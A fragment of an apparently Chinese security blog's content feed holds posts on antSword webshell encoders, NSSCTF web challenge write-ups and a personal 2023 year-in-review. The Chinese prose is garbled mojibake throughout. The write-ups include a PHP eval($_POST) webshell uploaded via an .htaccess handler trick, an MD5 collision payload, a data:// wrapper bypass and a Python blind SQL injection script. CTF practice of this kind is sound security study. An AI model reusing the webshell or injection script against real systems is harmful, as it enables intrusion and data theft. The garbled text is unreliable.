class="string">var z = data1+data+data2;</span></span><br><span class="line"><span class="string">return z;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * è§£ç  Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data è¦è¢«è§£ç çš„ Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>è§£ç åçš„ Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è‡´è°¢r"><a href="#è‡´è°¢r" class="headerlink" title="è‡´è°¢r"></a>è‡´è°¢r</h4><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰é”™è¯¯åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬æŒ‡æ­£å‹˜è¯¯ã€‚</p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https://yzddmr6.com/posts/antsword-diy-2/</span><br><span class="line">https://darkless.cn/2020/05/19/antsword-bypass-waf#bypass%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C</span><br><span class="line">https://xz.aliyun.com/t/7736?time__1311=n4%2BxnD0G0%3DKWwqYu405%2BbFYituY5DvP5DkeD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fu%2F31536</span><br><span class="line">https://xz.aliyun.com/t/7735?time__1311=n4%2BxnD0G0%3DKWwqYqD5DsA3OhDge1KdDuit%3DoD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fu%2F31536</span><br><span class="line">https://www.secpulse.com/archives/192415.html</span><br><span class="line">https://github.com/AntSwordProject/antSword/</span><br><span class="line">https://xz.aliyun.com/t/6701?time__1311=n4%2BxnD0DRDyDg7WtG%3DD%2Fia4qgWG8QD0rr278bD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</span><br><span class="line">https://sec.lz520520.com/2020/05/427/#0x02_UI</span><br><span class="line">https://xz.aliyun.com/t/6917?time__1311=n4%2BxnD0DRDyD9iDgGDcDBqOoQWjr1QCiD0rrD</span><br><span class="line">https://xz.aliyun.com/t/6571?time__1311=n4%2BxnD0DRDBAi%3DDk%2BNDsA3xCq4mwbTRGgD7Kx</span><br><span class="line">https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw</span><br><span class="line">https://github.com/yzddmr6/JspForAntSword/tree/master</span><br><span class="line">https://xz.aliyun.com/t/6701?time__1311=n4%2BxnD0DRDyDg7WtG%3DD%2Fia4qgDBGDfx7IvY5x&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7736%3Ftime__1311%3Dn4%252BxnD0G0%253DKWwqYu405%252BbFYitDCiKdtYrYe4D%26alichlgref%3Dhttps%253A%252F%252Fxz.aliyun.com%252Fu%252F31536#toc-5  ä»0åˆ°1æ‰“é€ ä¸€æ¬¾å ªç§°å®Œç¾antSword(èšå‰‘)</span><br><span class="line">https://www.cnblogs.com/LittleHann/p/5016999.html</span><br><span class="line">https://www.youncyb.cn/?p=700</span><br><span class="line">https://xz.aliyun.com/u/31536</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nssctfwebåˆ·é¢˜è®°å½•</title>
      <link href="/2024/02/23/nssctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nssctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/02/23/nssctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nssctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><img src="D:\myBlog\source\images\nssctfwebåˆ·é¢˜è®°å½•\image-20240223135432801.png" alt="image-20240223135432801"></p><h5 id="GDOUCTF-2023-æ³„éœ²çš„ä¼ªè£…"><a href="#GDOUCTF-2023-æ³„éœ²çš„ä¼ªè£…" class="headerlink" title="[GDOUCTF 2023]æ³„éœ²çš„ä¼ªè£…"></a>[GDOUCTF 2023]æ³„éœ²çš„ä¼ªè£…</h5><p><img src="D:\myBlog\source\images\nssctfwebåˆ·é¢˜è®°å½•\image-20240223140312152-17086682339191.png" alt="image-20240223140312152"></p><p>orzorz.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_get_contents(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ´—æ´—ç¡å§&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nononoononoonono</span><br></pre></td></tr></table></figure><p><a href="http://node5.anna.nssctf.cn:28206/orzorz.php?cxk=data://text/plain,ctrl">http://node5.anna.nssctf.cn:28206/orzorz.php?cxk=data://text/plain,ctrl</a></p><h5 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h5><p>robotsé‡Œ</p><p>md5å¼ºç¢°æ’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>sha1å¼ºç¢°æ’</p><h5 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-easyupload3-0"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload3.0"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload3.0</h5><p>å…ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;uploaded&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]);phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h5 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-error"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-error" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]error"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]error</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28666/index.php?id=1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bool_sql_database_name</span>():</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            </span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&lt;&#123;&#125;,1,0) and &#x27;a&#x27;=&#x27;a&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#information_schema,mysql,performance_schema,test,test_db</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,1,0) and &#x27;a&#x27;=&#x27;a&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#test_db-&gt;test_tb-&gt;id,flag,users</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;test_tb&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,1,0) and &#x27;a&#x27;=&#x27;a&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#test_db-&gt;test_tb-&gt;id,flag,users</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; and if(ascii(substr((select flag from test_db.test_tb),&#123;&#125;,1))&lt;&#123;&#125;,1,0) and &#x27;a&#x27;=&#x27;a&quot;.format(i,mid)</span></span><br><span class="line"></span><br><span class="line">            res = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;.....&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                high = mid </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid +<span class="number">1</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">bool_sql_database_name()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>polarctfreåˆ·é¢˜è®°å½•</title>
      <link href="/2024/02/23/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfre%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/02/23/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfre%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><p>32bit æœ‰upxçš„å£³ï¼Œè§£ä¸€ä¸‹</p><p><img src="D:\myBlog\source\images\polarctfreåˆ·é¢˜è®°å½•\image-20240223112401799.png" alt="image-20240223112401799"></p><p>idaå³å¯ shift+f12</p><h5 id="åŠ åŠ å‡å‡"><a href="#åŠ åŠ å‡å‡" class="headerlink" title="åŠ åŠ å‡å‡"></a>åŠ åŠ å‡å‡</h5><p><img src="D:\myBlog\source\images\polarctfreåˆ·é¢˜è®°å½•\image-20240223134022422.png" alt="image-20240223134022422"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2023</title>
      <link href="/2024/02/08/my/my2023/"/>
      <url>/2024/02/08/my/my2023/</url>
      
        <content type="html"><![CDATA[<p>åˆåˆ°äº†ä¸€å¹´ä¸€åº¦çš„æ€»ç»“æ—¶å€™äº†ï¼Œè½¬å¹´ä¸€å¹´åˆè¿‡å»äº†ã€‚æ—¶é—´æ˜¯è¿‡çš„çœŸå¿«å•Šã€‚<br>è½¬çœ¼é—´ï¼Œå¤§å­¦çš„ç”Ÿæ´»å·²ç»ç»“æŸäº†ï¼Œäº”å¹´çš„å¤§å­¦ç”Ÿæ´»ï¼Œæƒ³æƒ³è¿™äº”å¹´çš„å¤§å­¦ç”Ÿæ´»ï¼Œå¥½åƒä¹Ÿæ²¡æœ‰å­¦åˆ°ä»€ä¹ˆçŸ¥è¯†ï¼Œä½†æ˜¯å¥½åƒæœ‰å­¦åˆ°äº†ä¸€äº›çŸ¥è¯†ã€‚æ¯”ä¸Šä¸è¶³æ¯”ä¸‹æœ‰ä½™å§ã€‚</p><p>äº”å¹´çš„å¤§å­¦ç”Ÿæ´»ï¼Œæ€»ç»“ä¸‹æ¥ï¼Œå°±æ˜¯æ„Ÿè°¢å§ï¼Œæ„Ÿè°¢çˆ¶äº²å’Œå§å§ç»™æˆ‘é’±ä¸Šå¤§å­¦ï¼Œæ²¡æœ‰ä»–ä»¬ï¼Œæˆ–è®¸æˆ‘çš„å¤§å­¦éƒ½ä¸èƒ½å®Œæˆã€‚æ„Ÿè°¢ä¿¡å®‰äºŒç­å¸®åŠ©è¿‡æˆ‘çš„åŒå­¦ã€ä»¥åŠå¯¹æˆ‘ç‰¹åˆ«ç…§é¡¾çš„è€å¸ˆä»¬ã€‚æ„Ÿè°¢å¤§æ•°æ®ä¸€ç­å¸®åŠ©è¿‡æˆ‘çš„åŒå­¦ä»¬ï¼Œä»¥åŠå¯¹æˆ‘ç‰¹åˆ«ç…§é¡¾çš„è€å¸ˆä»¬å¹¶ä¸”ç»™æˆ‘éå¸¸é‡è¦é”»ç‚¼è‡ªå·±çš„æœºä¼šã€‚å½“ç„¶æœ€é‡è¦çš„è¿˜æ˜¯åœ¨å¤§å­¦çš„æœ€åä¸€å¹´æ‰¾åˆ°ä¸€ä¸ªéå¸¸éå¸¸ä¼˜ç§€çš„å¥³æœ‹å‹ï¼Œé™ªæˆ‘èµ°è¿‡äº†æœ€åä¸€å¹´çš„å¤§å­¦çš„æ—¶å…‰ã€‚<br>äºŒæœˆä»½ä¸€ä¸ªä»¥å‰hwè®¤è¯†çš„å¥½æœ‹å‹ï¼Œå¸¦æˆ‘å‚åŠ äº†cavd2023æ±½è½¦ä¿¡æ¯å®‰å…¨æ˜¥å­£èµ›ï¼Œæ‰“åˆ°æœ€åä¹Ÿæ²¡æœ‰æ‰“å‡ºæ¥ä»€ä¹ˆæˆæœï¼Œå€’æ˜¯åäº†åteslaï¼Œè½¦æŒºä¸é”™çš„ï¼Œå°±æ˜¯å¤ªè´µäº†ã€‚æœ€åå¤§æ°”çš„ä¸­æ±½ç ”è¿˜ç»™äº†ä¸ªå°ç±³çš„èºä¸åˆ€ï¼Œæ„Ÿè°¢å¤§å“¥å¸¦æˆ‘æ‰“æ¯”èµ›ï¼Œä¸‹æ¬¡æˆ‘è¿˜å»ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å››æœˆåº•äº†ï¼Œä¸‰ä¸ªå¥½å¤§å“¥å¸¦æˆ‘å»ç¦å·æ‰“æ¯”èµ›äº†ï¼Œå“¦å¯¹äº†ï¼Œè¿˜æœ‰ä¸¤ä¸ªéå¸¸éå¸¸å¥½çš„è€å¸ˆã€‚é‚£æ˜¯æˆ‘äººç”Ÿä¸­ç¬¬ä¸€æ¬¡åé£æœºï¼Œè¯´å®è¯å…¶å®éå¸¸å®³æ€•çš„ã€‚å°¤å…¶æ˜¯ç¬¬ä¸€æ¬¡åçš„æ—¶å€™ï¼Œé£æœºä¸Šå‡çš„æ—¶å€™ï¼Œé‚£ç§è…¾ç©ºçš„æ„Ÿè§‰ç¡®å®ä¸å¤ªå¥½å—ã€‚ä¸è¿‡æœ€åæˆç»©è¿˜æ˜¯ä¸é”™çš„ï¼Œæˆ–è®¸æœ€åé‚£ä¸ªæº¯æºåœ¨åŠªåŠ›åŠªåŠ›ï¼Œèƒ½æ‹¿ä¸ªå‰ä¸‰åçš„ï¼Œä½†ç¡®å®æœ€åçš„ä¸ä¼šåšäº†ï¼Œæ²¡åŠæ³•å¤ªèœäº†ã€‚åé¢åˆ†æåˆ†æï¼Œå…¶å®æŒºç®€å•çš„ï¼Œä½†æ˜¯æ¯”èµ›çš„æ—¶å€™ç¡®å®å¿ƒæ€æœ‰ç‚¹å´©ã€‚æ„Ÿè°¢æè€å¸ˆå’Œç½—è€å¸ˆè¯·æˆ‘ä»¬åƒæµ·é²œå¤§é¤ï¼Œä¹Ÿç»™æˆ‘è®²äº†è®¸å¤šçš„ï¼Œä»è€å¸ˆé‚£é‡Œä¹Ÿå­¦åˆ°äº†è®¸å¤šï¼Œä¹Ÿç»™æˆ‘æäº†è®¸å¤šå»ºè®®ï¼Œæˆ‘éƒ½è®°åœ¨å¿ƒé‡Œï¼Œæ…¢æ…¢æ”¹æ­£ã€‚è¿™æ˜¯æœ€åä¸€æ¬¡ä»¥å­¦ç”Ÿèº«ä»½å‚åŠ æ¯”èµ›äº†ã€‚äº”å¹´çš„å­¦ç”Ÿç”Ÿæ¶¯é‡Œå‚åŠ äº†å¾ˆå¤šæ¯”èµ›ï¼Œä¹Ÿè§è¯†åˆ°è®¸å¤šçš„å†…å¹•ï¼Œæœ‰äº›æ¯”èµ›çœŸçš„å¾ˆæã€‚ä»¥åå°±æ˜¯ä»¥å·¥ä½œçš„èº«ä»½å‚åŠ æ¯”èµ›äº†ï¼Œä¸çŸ¥é“ç¯å¢ƒä¼šä¸ä¼šå¥½ä¸€ç‚¹ï¼Œæˆ–è®¸æ›´æã€‚äº”å¹´çš„æ¯”èµ›è®©æˆ‘å­¦ä¼šäº†ï¼Œå›¢é˜Ÿçš„é‡è¦æ€§ï¼Œä¸€ä¸ªäººçš„èƒ½åŠ›å’Œæ—¶é—´æ¯•ç«Ÿæ˜¯æœ‰é™çš„ã€‚å…¶å®å­¦ç”Ÿçš„æ¯”èµ›ç”Ÿæ¶¯å°±è¿™ä¹ˆç»“æŸè¿˜æ˜¯éå¸¸é—æ†¾çš„ï¼Œæ¢¦æƒ³èƒ½ç»„ä¸€ä¸ªå°å›¢é˜Ÿï¼Œå»æ‰“å„ç§æ¯”èµ›ï¼Œwebï¼Œreï¼Œpwnï¼Œmiscï¼Œcryptoï¼Œéƒ½æœ‰å°ä¼™ä¼´ï¼Œæ‰“æ¯”èµ›ä¸€å«éƒ½æ¥ï¼Œå’”å’”å’”éƒ½èƒ½æ‹¿ä¸‹é¢˜ç›®ï¼Œä½†å®é™…ä¸Šï¼Œåˆ°æœ€åå°±æˆ‘è‡ªå·±åœ¨é‚£è‹¦è‹¦çš„ç ”ç©¶webé¢˜ï¼Œç ”ç©¶å®Œäº†ï¼Œæ¯”èµ›ä¹Ÿç»“æŸäº†ã€‚ä¸€å¥è¯ï¼Œè´µåœ¨åšæŒã€‚è¯´è¿œäº†ï¼Œå†æ¬¡æ„Ÿè°¢è€å¸ˆå’Œå¤§å“¥ä»¬å¸¦æˆ‘æ‰“æ¯”èµ›ï¼Œè´´å‡ å¼ ç…§ç‰‡ã€‚</p><p><img src="/images/my2023/image-20240207162912823.png" alt="image-20240207162912823"></p><p><img src="/images/my2023/image-20240207162931786.png" alt="image-20240207162931786"></p><p><img src="/images/my2023/image-20240207162948355.png" alt="image-20240207162948355"></p><p><img src="/images/my2023/image-20240207163008242.png" alt="image-20240207163008242"></p><p><img src="/images/my2023/image-20240207163026870.png" alt="image-20240207163026870"></p><p><img src="/images/my2023/image-20240207163040470.png" alt="image-20240207163040470"></p><p><img src="/images/my2023/image-20240207163057191.png" alt="image-20240207163057191"></p><p>äº”æœˆä»½ä¹Ÿä»£è¡¨å­¦æ ¡å‚åŠ äº†æ•™è‚²çš„æ”»é˜²æ¼”ç»ƒã€‚ä¸­é—´ä¹Ÿç¡®å®å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæœ€åç»“æœæ˜¯å¥½çš„å°±å¥½äº† ã€‚æ„Ÿè°¢ç‹è€å¸ˆæè€å¸ˆä¸€ç›´å¸®åŠ©æˆ‘ï¼Œä¸ç„¶æˆ‘çœŸçš„ä¸çŸ¥é“è¯¥æ€ä¹ˆåŠäº†ã€‚æ„Ÿè°¢å°ä¼™ä¼´ä»¬çš„ç†è§£ã€‚ä¹Ÿç»™è‡ªå·±ä¸ªæ•™è®­å§ï¼Œå½“é‡åˆ°æœ‰å…³åˆ©ç›Šã€é‡‘é’±çš„äº‹æƒ…ï¼Œå¤šé—®ä¸€å˜´ï¼Œå¤šæƒ³æƒ³ã€‚</p><p>å…­æœˆä»½å¿™ç€å†™æˆ‘çš„æ¯•ä¸šè®ºæ–‡äº†ï¼Œè¯´å®è¯ï¼Œæˆ‘è‡ªå·±éƒ½æ„Ÿè§‰æˆ‘å†™çš„è®ºæ–‡å¾ˆçƒ‚ã€‚<br>æ¯•ä¸šåä¹Ÿé™†é™†ç»­ç»­æ‰¾äº†äº›å·¥ä½œï¼Œé¢äº†é¢è¯•ï¼Œè‡ªæˆ‘æ„Ÿè§‰è‰¯å¥½ï¼Œå¤©æ´¥æ²¡æœ‰é‚£ä¹ˆå·ï¼ŒæŠ€æœ¯è¦æ±‚çš„è¯ä¹Ÿæ²¡æœ‰é‚£ä¹ˆé«˜ï¼Œä½†ç¡®å®å·¥èµ„ä¹Ÿæ²¡æœ‰é‚£ä¹ˆé«˜ï¼Œå½“åˆé¢äº†ä¸€ä¸ªé‚£ä¸ªå®‰å…¨å…¬å¸ï¼Œæ„Ÿè§‰èŠçš„ä¹Ÿè¿˜è¡Œï¼Œå·¥ä½œå†…å®¹å•¥çš„ä¹Ÿè¿˜æ¯”è¾ƒæ»¡æ„ï¼Œä½†æ˜¯æœ€åæ²¡æœ‰è¦æˆ‘ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚</p><p>æ¥ä¸‹æ¥å…«æœˆä»½å°±æ˜¯hwäº†ï¼Œæœ¬æ¥è¯´ä»Šå¹´ä¸hwæ¥ç€ï¼Œä½†æ˜¯é˜´å·®é˜³é”™çš„åˆå»äº†hwã€‚åœ¨é‚£è¾¹ä¹Ÿç¢°åˆ°äº†å¾ˆå¥½çš„åå“¥å’Œé’±å“¥ï¼Œå¸®åŠ©äº†æˆ‘å¾ˆå¤šï¼Œç”²æ–¹çš„é¥­ç¡®å®æŒºå¥½çš„ï¼Œåå“¥å’Œé’±å“¥ä¹°çš„é›¶é£Ÿä¹Ÿè´¼å¥½åƒï¼Œå°±æ˜¯å€¼å¤œç­ç†¬å¾—ç¡®å®æœ‰ç‚¹å¿«æŒºä¸ä½äº†ï¼Œé‚£æ—¶å€™æ„Ÿè§‰æµ‘èº«å“ªéƒ½ç–¼ã€‚ç”²æ–¹ä¹ŸæŒºæœ‰æ„æ€ã€æŒºå¼ºçš„ï¼Œç»™æˆ‘è®²å®¹å™¨çš„å’Œä»–ä»¥å‰ç©IBMå°é¸¡çš„äº‹æƒ…ï¼Œå’Œä»¥å‰å‡ºå»èµšå¾ˆå¤šå¤–å¿«ï¼Œä½†æ˜¯æ…¢æ…¢æ¥ä¸åˆ°ç§æ´»çš„äº‹æƒ…ã€‚æ€ä¹ˆè¯´å‘¢ï¼Œæˆ–è®¸æ—¶ä»£åœ¨æ”¹å˜å§ã€‚åœ¨é‚£é‡Œä¹Ÿè§è¯†åˆ°äº†ä»€ä¹ˆå«24å°æ—¶è¿ç»´ï¼ŒåŠå¤œ1ç‚¹å‡çº§ç³»ç»Ÿæ˜¯å¸¸æ€ï¼ŒåŠå¤œä¸‰å››ç‚¹è¢«å«èµ·æ¥æŸ¥æ—¥å¿—ï¼Œä¿®æ¼æ´ï¼ŒæŸ¥åŸå› æ˜¯çœŸçš„è¾›è‹¦ã€‚æˆ‘ä¼°è®¡ä¸€èˆ¬äººæ˜¯çœŸé¡¶ä¸ä½ã€‚</p><p>åäºŒæœˆä»½åŠ å…¥äº†è¿™ä¸ªæ¸—é€ç»„å§ï¼Œç»„é‡Œçš„å¤§å“¥ä»¬æŠ€æœ¯éƒ½å¾ˆå¼ºï¼Œå‘çš„æ–‡ç« å’ŒæŠ€æœ¯ç ”ç©¶ï¼Œæˆ‘éƒ½è¦çœ‹åŠå¤©ï¼Œçœ‹åŠå¤©äº†ä¹Ÿçœ‹ä¸å¤ªæ‡‚ï¼Œåœ¨å­¦æ ¡é‡Œï¼Œåˆ«äººéƒ½è¯´æˆ‘å¾ˆå¼ºï¼Œå…¶å®æˆ‘æ·±çŸ¥æˆ‘å•¥ä¹Ÿä¸æ˜¯ï¼Œäººå¤–æœ‰äººï¼Œå¤©å¤–æœ‰å¤©ï¼Œè¿˜è¦ä¸€ç›´å­¦ä¹ ã€‚</p><p>æœ€åè‚¯å®šè¦æ„Ÿè°¢ä»¥å‰è®¤è¯†çš„å¥½å¤§å“¥äº†ï¼Œæˆ–è®¸çœŸçš„æ˜¯å¤§ä¼šé‚£å¤©è·Ÿä»–èŠäº†ä¸¤å¥ï¼Œé—®é—®ä»–çš„äº§å“æ˜¯åšä»€ä¹ˆçš„ã€‚å½“æ—¶æˆ‘è®°çš„æ˜¯ä¸€ä¸ªé’“é±¼æ¼”ç»ƒçš„å¹³å°ï¼Œæˆ‘ä»¥ä¸ºæ˜¯å–è¿™ä¸ªé’“é±¼çš„è®¾å¤‡ï¼Œå…¶å®ä¸æ˜¯ï¼Œæ˜¯å–æœåŠ¡ï¼Œç»™å®¢æˆ·æ¼”ç»ƒä¸€æ¬¡é’“é±¼ï¼Œæˆ‘å½“æ—¶é—®è¿™ä¸ªå¤šå°‘é’±ä¸€æ¬¡ï¼Œæˆ‘æƒ³è€…æœ€é«˜ä¹Ÿå°±1wå§ï¼Œä»–è¯´10wï¼Œæˆ‘å½“æ—¶å°±æ„Ÿè§‰ï¼Œè¿™ä¸œè¥¿çœŸèµšé’±ï¼Œä¸æ˜¯ï¼Œè¿™æœåŠ¡çœŸèµšé’±ã€‚ä¸å¤šè¯´ï¼Œèƒ½ææˆä¸ª1%ï¼Œ1000å—ã€‚ä»é‚£ä»¥åæ…¢æ…¢çš„æ‰“æ¯”èµ›å•¥çš„ï¼Œä¹Ÿéƒ½è§åˆ°è¿‡ã€‚æ„Ÿè°¢å“¥è¿™å‡ ä¸ªæœˆå¯¹æˆ‘çš„ç…§é¡¾å§ã€‚ä¸æ˜¯å“¥çš„å¸®åŠ©ï¼Œæˆ‘ç°åœ¨ä¹Ÿä¸å¯èƒ½ååœ¨å·¥ä½ä¸Šå†™è¿™ç¯‡æ–‡ç« 